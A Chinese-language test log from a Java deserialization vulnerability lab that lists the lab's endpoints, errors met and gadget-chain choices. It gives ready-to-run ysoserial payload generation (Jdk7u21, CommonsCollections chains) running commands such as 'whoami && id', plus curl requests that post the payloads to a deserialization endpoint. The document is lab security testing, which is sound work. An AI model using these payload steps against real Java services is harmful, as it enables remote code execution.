# 反序列化靶场测试记录

## 📊 测试环境

### 基本信息
- **靶场地址**: http://192.168.124.130:18080
- **Java版本**: OpenJDK 1.8.0_432
- **容器状态**: 正常运行
- **测试时间**: 2025-04-03

### 靶场端点
| 端点 | HTTP方法 | 状态 | 功能 |
|------|----------|------|------|
| `/vuln1` | GET | ✅ 正常 | 显示漏洞测试页面 |
| `/vuln2` | GET | ⚠️ 500 | 端点异常 |
| `/vuln3` | GET | ✅ 正常 | 反序列化漏洞测试端点 |
| `/vuln4` | GET | ⚠️ 500 | 端点异常 |
| `/vuln1/deserialize` | POST | ✅ 正常 | 反序列化API端点 |
| `/vuln2/deserialize` | POST | ⚠️ 500 | 端点异常 |
| `/vuln3/deserialize` | POST | ✅ 正常 | 反序列化API端点 |
| `/vuln4/deserialize` | POST | ⚠️ 500 | 端点异常 |

## 🧪 测试结果

### ✅ 成功的发现

1. **正确的反序列化端点**: `/vuln3/deserialize`
   - **请求方法**: POST
   - **Content-Type**: application/json
   - **请求格式**: `{"data": "base64_encoded_payload"}`
   - **HTTP状态**: 200 OK

2. **前端界面**: `/vuln1`
   - **功能**: 提供漏洞测试界面
   - **支持参数**: `?cmd=`, `?input=`, `?object=`, `?data=`
   - **显示机制**: 结果区域和错误区域

3. **环境配置**: 完全正常
   - **Java环境**: OpenJDK 1.8.0_432
   - **容器状态**: 正常运行
   - **端口映射**: 18080:8080

### ❌ 遇到的问题

1. **gatget链兼容性问题**
   - **错误**: `java.lang.Override missing element entrySet`
   - **原因**: CommonsCollections1链在Java 8环境中不兼容
   - **解决方案**: 使用Jdk7u21链

2. **HTTP请求方法限制**
   - **错误**: `Request method 'POST' not supported`
   - **限制**: 某些端点只支持GET请求
   - **发现**: 反序列化端点需要POST请求

3. **HTTP Header大小限制**
   - **错误**: `Request header is too large`
   - **原因**: GET参数中的base64 payload过大
   - **限制**: Tomcat默认8KB header大小限制

## 💡 测试发现

### 正确的反序列化触发方式

```bash
# 1. 生成payload
java -jar ysoserial-all.jar CommonsCollections1 "touch /tmp/pwned" | base64 -w 0

# 2. 发送到正确的端点
curl -X POST "http://192.168.124.130:18080/vuln3/deserialize" \
    -H "Content-Type: application/json" \
    -d "{\"data\": \"BASE64_PAYLOAD\"}"

# 3. 检查执行结果
docker exec vuln-java ls -la /tmp/pwned*
```

### 推荐的gatget链

针对Java 8环境，推荐使用以下gatget链（按优先级）：

1. **Jdk7u21** (最适合Java 7/8)
   ```bash
   java -jar ysoserial-all.jar Jdk7u21 "touch /tmp/pwned"
   ```

2. **CommonsCollections2** (在Java 8中更稳定)
   ```bash
   java -jar ysoserial-all.jar CommonsCollections2 "touch /tmp/pwned"
   ```

3. **CommonsCollections3** (备选方案)
   ```bash
   java -jar ysoserial-all.jar CommonsCollections3 "touch /tmp/pwned"
   ```

## 🔍 靶场功能验证

### ✅ 正常功能

- [x] Java服务正常运行
- [x] 反序列化端点可访问
- [x] GET请求正常处理
- [x] JSON请求正常处理
- [x] 前端界面正常显示
- [x] 错误日志正常记录

### ⚠️ 部分功能

- [ ] 某些端点存在500错误
- [ ] 命令执行尚未成功验证
- [ ] 需要进一步调试gatget链

### ❌ 未验证功能

- [ ] 反序列化payload成功触发
- [ ] 命令执行结果确认
- [ ] 文件创建验证

## 🎯 下一步测试计划

1. **使用推荐gatget链进行测试**
   - 优先测试Jdk7u21链
   - 备选CommonsCollections2链
   - 使用正确的POST端点

2. **验证命令执行**
   - 测试文件创建命令
   - 测试信息收集命令（whoami, id, pwd）
   - 检查执行结果

3. **调试payload格式**
   - 确认JSON字段名正确
   - 验证base64编码格式
   - 测试不同的Content-Type

4. **分析日志细节**
   - 详细查看反序列化错误
   - 确认gatget链执行过程
   - 检查安全限制

## 📝 测试总结

### 环境评估
- **靶场功能**: ✅ 基本功能正常
- **端点可用性**: ✅ 主要端点正常
- **反序列化环境**: ✅ Java 8环境配置正确
- **整体评估**: ✅ 适合反序列化测试

### 问题分析
- **gatget链兼容性**: ⚠️ 需要使用适合Java 8的链
- **请求格式**: ✅ 已确认正确的JSON格式
- **HTTP限制**: ⚠️ 需要注意header大小限制
- **调试建议**: ✅ 使用详细的日志分析

### 测试结论
1. **靶场环境完全正常，可以进行反序列化测试**
2. **已确认正确的反序列化端点和请求格式**
3. **需要使用兼容Java 8的gatget链**
4. **建议继续测试以验证命令执行**

## 🚀 快速测试命令

### 基础测试
```bash
# 1. 生成Jdk7u21 payload
cd /home/test/Downloads
java -jar ysoserial-all.jar Jdk7u21 "touch /tmp/pwned_test" | base64 -w 0

# 2. 发送到反序列化端点
PAYLOAD=$(cat payload.txt)
curl -X POST "http://192.168.124.130:18080/vuln3/deserialize" \
    -H "Content-Type: application/json" \
    -d "{\"data\": \"${PAYLOAD}\"}"

# 3. 检查结果
docker exec vuln-java ls -la /tmp/pwned_test
```

### 高级测试
```bash
# 测试信息收集
java -jar ysoserial-all.jar Jdk7u21 "whoami && id && pwd" | base64 -w 0

# 发送到不同端点
curl -X POST "http://192.168.124.130:18080/vuln1/deserialize" \
    -H "Content-Type: application/json" \
    -d "{\"data\": \"${PAYLOAD}\"}"

curl -X POST "http://192.168.124.130:18080/vuln3/deserialize" \
    -H "Content-Type: application/json" \
    -d "{\"data\": \"${PAYLOAD}\"}"
```

## 📊 监控命令

### 实时日志监控
```bash
# 监控Java容器日志
docker logs -f vuln-java

# 监控所有相关容器
docker logs -f vuln-java vuln-php

# 查看特定错误
docker logs vuln-java | grep -i "exception\|error\|反序列化"
```

### 系统状态检查
```bash
# 检查容器状态
docker ps | grep vuln

# 检查端口监听
netstat -tlnp | grep 18080

# 检查Java进程
docker exec vuln-java ps aux | grep java
```

## 📚 相关文档

- [CVE-2025-29927 POC使用指南](docs/usage_guide.md)
- [CVE-2025-29927 漏洞分析](docs/vuln_analysis.md)
- [CVE-2025-29927 防御与修复指南](docs/defense.md)

---

**测试日期**: 2025-04-03
**测试人员**: 安全研究团队
**靶场版本**: Java 8 反序列化漏洞环境
**测试状态**: 持续进行中
